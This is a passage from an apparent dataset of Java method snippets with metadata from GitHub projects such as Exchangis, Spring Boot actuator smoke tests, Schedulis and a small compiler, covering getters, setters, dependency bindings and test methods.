"https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 31297, "method_name": "getFromReader", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Record", "snippet": "    public Record getFromReader() {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n        boolean isEmpty = (this.bufferIndex >= this.buffer.size());\n        if (isEmpty) {\n            receive();\n        }\n\n        Record record = this.buffer.get(this.bufferIndex++);\n        if (record instanceof TerminateRecord) {\n            record = null;\n        }\n        return record;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 31298, "method_name": "shutdown", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutdown() {\n        shutdown = true;\n        buffer.clear();\n        recordChannel.clear();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 31299, "method_name": "receive", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void receive() {\n        this.recordChannel.pullAll(this.buffer);\n        this.bufferIndex = 0;\n        this.bufferSize = this.buffer.size();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 31300, "method_name": "onCreate", "class_name": "BaseGlobalVar", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        dataStatsCountry = GlobalVar.getInstance().getDataStatsCountry();\n        dataStatsSummary = GlobalVar.getInstance().getDataStatsSummary();\n        dataStatsGlobal   = GlobalVar.getInstance().getDataStatsGlobal();\n        layoutStatisticHeight = GlobalVar.getInstance().getLayoutStatisticHeight();\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/base/BaseGlobalVar.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 31301, "method_name": "testHome", "class_name": "ShutdownSampleActuatorApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testHome() {\n\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\n\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/\", Map.class));\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tMap<String, Object> body = entity.getBody();\n\t\tassertThat(body.get(\"message\")).isEqualTo(\"Hello Phil\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31302, "method_name": "testShutdown", "class_name": "ShutdownSampleActuatorApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testShutdown() {\n\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(this.restTemplate.withBasicAuth(\"user\", \"password\")\n\t\t\t\t.postForEntity(\"/actuator/shutdown\", null, Map.class));\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(((String) entity.getBody().get(\"message\"))).contains(\"Shutting down\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31303, "method_name": "asMapEntity", "class_name": "ShutdownSampleActuatorApplicationTests", "params": ["ResponseEntity<Map>"], "throws": null, "modifiers": ["static"], "return_type": "ResponseEntity<Map>", "snippet": "\tstatic <K, V> ResponseEntity<Map<K, V>> asMapEntity(ResponseEntity<Map> entity) {\n\t\treturn (ResponseEntity) entity;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31304, "method_name": "configure", "class_name": "SecurityConfiguration", "params": ["HttpSecurity"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "\t\tprotected void configure(HttpSecurity http) throws Exception {\n\t\t\thttp.csrf().disable();\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": "WebSecurityConfigurerAdapter", "implements": null, "modifiers": ["static"]}}, {"id": 31305, "method_name": "checkType", "class_name": "ExprPOINTER", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\tthis.getSon().checkType();\n\t\tgetSon().getType().assertType(this, TypeCode.POINTER);\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 31306, "method_name": "constEval", "class_name": "ExprPOINTER", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object constEval(Environment<ExprVALUE> environment) throws EnvironmentException, TypeException {\n\t\tthrow new TypeException(\"erreur syst\u00e8me\", line, column);\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 31307, "method_name": "toString", "class_name": "ExprPOINTER", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn this.getSon() + \"^\";\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 31308, "method_name": "getPointerCode", "class_name": "ExprPOINTER", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPointerCode() throws CodeException {\n\t\tString result;\n\t\tresult = getSon().generateCode();\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 31309, "method_name": "generateCode", "class_name": "ExprPOINTER", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result;\n\t\tresult = \"*\" + getSon().generateCode();\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 31310, "method_name": "configure", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void configure() {\n    install(new AzkabanCoreModule(this.props));\n    bind(Storage.class).to(resolveStorageClassType());\n    bind(AzkabanDataSource.class).to(resolveDataSourceType());\n    bind(TriggerLoader.class).to(JdbcTriggerImpl.class);\n    bind(ProjectLoader.class).to(JdbcProjectImpl.class);\n    bind(ExecutorLoader.class).to(JdbcExecutorLoader.class);\n    bind(ExecutorQueueLoader.class).to(JdbcExecutorQueueLoader.class);\n    bind(SystemUserLoader.class).to(JdbcSystemUserImpl.class);\n    bind(ExecutionLogsAdapter.class).to(resolveExecutionLogsType());\n    bind(TransitionService.class);\n    bind(UserManager.class).to(SystemUserManager.class);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 31311, "method_name": "resolveStorageClassType", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<Storage>", "snippet": "  public Class<? extends Storage> resolveStorageClassType() {\n    final StorageImplementationType type = StorageImplementationType\n        .from(this.config.getStorageImplementation());\n    if (type == StorageImplementationType.HDFS) {\n      install(new HadoopModule(this.props));\n    }\n    if (type != null) {\n      return type.getImplementationClass();\n    } else {\n      return loadCustomStorageClass(this.config.getStorageImplementation());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 31312, "method_name": "loadCustomStorageClass", "class_name": "AzkabanCommonModule", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Class<Storage>", "snippet": "  private Class<? extends Storage> loadCustomStorageClass(final String storageImplementation) {\n    try {\n      return (Class<? extends Storage>) Class.forName(storageImplementation);\n    } catch (final ClassNotFoundException e) {\n      throw new StorageException(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 31313, "method_name": "resolveDataSourceType", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Class<AzkabanDataSource>", "snippet": "  private Class<? extends AzkabanDataSource> resolveDataSourceType() {\n\n    final String databaseType = this.props.getString(\"database.type\");\n    if (databaseType.equals(\"h2\")) {\n      return H2FileDataSource.class;\n    } else {\n      return MySQLDataSource.class;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 31314, "method_name": "resolveExecutionLogsType", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Class<ExecutionLogsAdapter>", "snippet": "  private Class<? extends ExecutionLogsAdapter> resolveExecutionLogsType() {\n    return ExecutionLogsDao.class;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 31315, "method_name": "createQueryRunner", "class_name": "AzkabanCommonModule", "params": ["AzkabanDataSource"], "throws": null, "modifiers": ["public"], "return_type": "QueryRunner", "snippet": "  public QueryRunner createQueryRunner(final AzkabanDataSource dataSource) {\n    return new QueryRunner(dataSource);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 31316, "method_name": "addRequestInterceptor", "class_name": "RequestExecutor", "params": ["RequestInterceptor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addRequestInterceptor(RequestInterceptor requestInterceptor){\n        this.requestInterceptors.add(requestInterceptor);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31317, "method_name": "addValidator", "class_name": "RequestExecutor", "params": ["IValidator"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addValidator(IValidator validator) {\n        this.validators.put(validator.support(), validator);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31318, "method_name": "setConfiguration", "class_name": "RequestExecutor", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setConfiguration(Configuration configuration) {\n        this.configuration = configuration;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31319, "method_name": "setStatementExecutor", "class_name": "RequestExecutor", "params": ["StatementExecutor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatementExecutor(StatementExecutor statementExecutor) {\n        this.statementExecutor = statementExecutor;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31320, "method_name": "setExpressionEngine", "class_name": "RequestExecutor", "params": ["ExpressionEngine"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExpressionEngine(ExpressionEngine expressionEngine) {\n        this.expressionEngine = expressionEngine;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31321, "method_name": "invoke", "class_name": "RequestExecutor", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object invoke(HttpServletRequest request) {\n        return invoke(request, null);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31322, "method_name": "invoke", "class_name": "RequestExecutor", "params": ["HttpServletRequest", "Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object invoke(HttpServletRequest request, @RequestBody(required = false) Object requestBody) {\n        try {\n            // \u521b\u5efaRequestContex\u5bf9\u8c61\uff0c\u4f9b\u540e\u7eed\u4f7f\u7528\n            RequestContext requestContext = new RequestContext(request, expressionEngine);\n            if (!requestContext.containsKey(\"body\")) {\n                requestContext.setRequestBody(requestBody);\n            }\n            Statement statement = configuration.getStatement(requestContext.getRequestMapping());\n            requestContext.setStatement(statement);\n            // \u6267\u884c\u524d\u7f6e\u62e6\u622a\u5668\n            for (RequestInterceptor requestInterceptor : requestInterceptors) {\n                Object value = requestInterceptor.preHandle(requestContext);\n                if (value != null) {\n                    return value;\n                }\n            }\n            // \u6267\u884c\u6821\u9a8c\n            Object value = validate(statement, requestContext);\n            if (value != null) {\n                return value;\n            }\n            // \u6267\u884c\u8bed\u53e5\n            value = new JsonBean<>(statementExecutor.execute(statement, requestContext));\n            // \u6267\u884c\u540e\u7f6e\u62e6\u622a\u5668\n            for (RequestInterceptor requestInterceptor : requestInterceptors) {\n                Object target = requestInterceptor.postHandle(requestContext, value);\n                if (target != null) {\n                    return target;\n                }\n            }\n            return value;\n        } catch (Exception e) {\n            if (configuration.isThrowException()) {\n                throw new S8Exception(\"ssssssss\u6267\u884c\u51fa\u9519\", e);\n            }\n            logger.error(\"\u7cfb\u7edf\u51fa\u73b0\u9519\u8bef\", e);\n            return new JsonBean<>(-1, e.getMessage());\n        }\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31323, "method_name": "validate", "class_name": "RequestExecutor", "params": ["Statement", "RequestContext"], "throws": null, "modifiers": ["private"], "return_type": "JsonBean<Void>", "snippet": "    private JsonBean<Void> validate(Statement statement, RequestContext requestContext) {\n        List<String> validates = statement.getValidates();\n        XMLStatement xmlStatement = statement.getXmlStatement();\n        for (String validateId : validates) {\n            ValidateStatement validateStatement = xmlStatement.getValidateStatement(validateId);\n            NodeList nodeList = validateStatement.getNodes();\n            for (int i = 0, len = nodeList.getLength(); i < len; i++) {\n                Node node = nodeList.item(i);\n                // \u83b7\u53d6name\u503c\n                String name = DomUtils.getNodeAttributeValue(node, \"name\");\n                Object value = null;\n                // \u5982\u679cname\u503c\u586b\u4e86\uff0c\u5219\u53d6\u5176\u8868\u8fbe\u5f0f\u503c\n                if (StringUtils.isNotBlank(name)) {\n                    value = requestContext.evaluate(name);\n                }\n                NodeList ruleList = (NodeList) DomUtils.evaluate(\"*\", node, XPathConstants.NODESET);\n                for (int j = 0, l = ruleList.getLength(); j < l; j++) {\n                    Node rule = ruleList.item(j);\n                    // \u5982\u679c\u9a8c\u8bc1\u5931\u8d25\uff0c\u8fd4\u56de\u81ea\u5b9a\u4e49code\n                    String nodeName = rule.getNodeName();\n                    IValidator validator = validators.get(nodeName);\n                    Assert.isNotNull(validator, String.format(\"\u627e\u4e0d\u5230\u9a8c\u8bc1\u5668:%s\", nodeName));\n                    if (!validator.validate(value, rule)) {\n                        // rule->param->validate\n                        int defaultCode = NumberUtils.toInt(DomUtils.getNodeAttributeValue(node, \"code\"), validateStatement.getCode());\n                        int code = NumberUtils.toInt(DomUtils.getNodeAttributeValue(rule, \"code\"), defaultCode);\n                        String message = rule.getTextContent();\n                        if (StringUtils.isNotBlank(message)) {\n                            message = message.trim();\n                        } else {\n                            message = DomUtils.getNodeAttributeValue(node, \"message\");\n                            if (StringUtils.isNotBlank(message)) {\n                                message = message.trim();\n                            } else {\n                                message = validateStatement.getMessage();\n                            }\n                        }\n                        return new JsonBean<>(code, message);\n                    }\n                }\n            }\n        }\n        // \u9a8c\u8bc1\u901a\u8fc7\n        return null;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31324, "method_name": "resolveParams", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> resolveParams(){\n        if(null == parameterMap){\n            if (StringUtils.isNotBlank(parameter)){\n                parameterMap = Json.fromJson(getParameter(), Map.class);\n            }else {\n                parameterMap = new HashMap<>(4);\n            }\n        }\n        return parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31325, "method_name": "getId", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31326, "method_name": "setId", "class_name": "DataSourceBase", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(long id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31327, "method_name": "getSourceName", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSourceName() {\n        return sourceName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31328, "method_name": "setSourceName", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSourceName(String sourceName) {\n        this.sourceName = sourceName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31329, "method_name": "getSourceDesc", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSourceDesc() {\n        return sourceDesc;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31330, "method_name": "setSourceDesc", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSourceDesc(String sourceDesc) {\n        this.sourceDesc = sourceDesc;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31331, "method_name": "getSourceType", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSourceType() {\n        return sourceType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31332, "method_name": "setSourceType", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSourceType(String sourceType) {\n        this.sourceType = sourceType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31333, "method_name": "getOwner", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOwner() {\n        return owner;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31334, "method_name": "setOwner", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOwner(String owner) {\n        this.owner = owner;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31335, "method_name": "getModelId", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getModelId() {\n        return modelId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31336, "method_name": "setModelId", "class_name": "DataSourceBase", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModelId(Integer modelId) {\n        this.modelId = modelId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31337, "method_name": "getAuthCreden", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAuthCreden() {\n        return authCreden;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31338, "method_name": "setAuthCreden", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthCreden(String authCreden) {\n        this.authCreden = authCreden;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31339, "method_name": "getAuthEntity", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAuthEntity() {\n        return authEntity;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31340, "method_name": "setAuthEntity", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthEntity(String authEntity) {\n        this.authEntity = authEntity;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31341, "method_name": "getCreateTime", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getCreateTime() {\n        return createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31342, "method_name": "setCreateTime", "class_name": "DataSourceBase", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Date createTime) {\n        this.createTime = createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31343, "method_name": "getCreateUser", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCreateUser() {\n        return createUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31344, "method_name": "setCreateUser", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateUser(String createUser) {\n        this.createUser = createUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31345, "method_name": "getModifyUser", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getModifyUser() {\n        return modifyUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31346, "method_name": "setModifyUser", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModifyUser(String modifyUser) {\n        this.modifyUser = modifyUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31347, "method_name": "getModifyTime", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": " 